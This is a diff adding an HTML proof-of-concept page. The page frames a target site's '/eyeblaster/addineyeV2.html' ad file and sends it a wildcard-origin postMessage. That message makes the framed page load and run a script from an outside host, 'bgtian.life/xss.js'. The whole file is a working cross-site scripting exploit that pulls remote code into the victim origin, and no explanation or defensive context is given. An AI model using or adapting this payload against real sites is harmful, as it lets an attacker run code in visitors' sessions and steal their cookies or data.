@@ -1,0 +1,13 @@
+<html>
+<script type="text/javascript">
+window.addEventListener("message", receiveMessage, false);
+function receiveMessage(event)
+{
+    var data = JSON.parse(event.data);
+    console.log(data); // Should be ebInnerIframeLoaded
+    document.getElementById("if").contentWindow.postMessage('{"type":"ebVerifyInnerIframe", "data":{"ebProtocol":"https://","ebBs":"bgtian.life/xss.js#"}}','*');
+}
+</script>
+</head><body>
+<iframe id="if" src="<TARGET>/eyeblaster/addineyeV2.html"></iframe>
+</body></html>
